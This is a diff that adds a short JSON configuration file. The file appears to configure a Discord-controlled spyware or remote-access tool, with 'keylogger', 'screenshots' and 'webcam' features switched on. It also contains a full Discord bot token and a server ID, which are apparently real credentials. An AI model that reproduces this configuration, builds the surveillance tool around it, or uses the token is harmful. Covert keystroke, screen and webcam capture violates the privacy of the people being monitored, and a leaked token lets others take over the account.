@@ -1,0 +1,11 @@
+{
+  "version": "2.0.0",
+  "discord_bot_token": "MTI2OTIwMzM4MTUzMzAyMDI4Mg.GSdWlX.3_-CZe1p1Dwp5VOkQQV2ZowkSAmhxng4UZMxRM",
+  "server_id": "917959819170828349",
+  "last_update": "2025-10-23",
+  "features": {
+    "keylogger": true,
+    "screenshots": true,
+    "webcam": true
+  }
+}
